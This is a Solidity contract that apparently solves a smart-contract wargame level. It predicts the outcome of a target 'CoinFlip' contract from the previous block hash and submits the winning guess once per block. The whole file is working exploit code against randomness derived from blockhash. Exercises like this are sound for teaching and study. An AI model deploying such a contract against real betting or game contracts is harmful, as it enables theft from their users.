// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract WinnerFlip {

	uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  CoinFlip public coinFlip;

	address _coinFlipAddress;

	constructor(address payable coinFlipAddress) {
		coinFlip = CoinFlip(coinFlipAddress);
		_coinFlipAddress = coinFlipAddress;
	}

	function winnerFlipper() public {
		uint256 blockValue = uint256(blockhash(block.number - 1));

		if (lastHash == blockValue) {
		revert();
		}

		lastHash = blockValue;
		uint256 _coinFlip = blockValue / FACTOR;
		bool side = _coinFlip == 1 ? true : false;

	(bool ok,) = _coinFlipAddress.call{value: 0, gas: 60000}(abi.encodeWithSignature("flip(bool)", side));
	require (ok, "Failed...");
	} 
}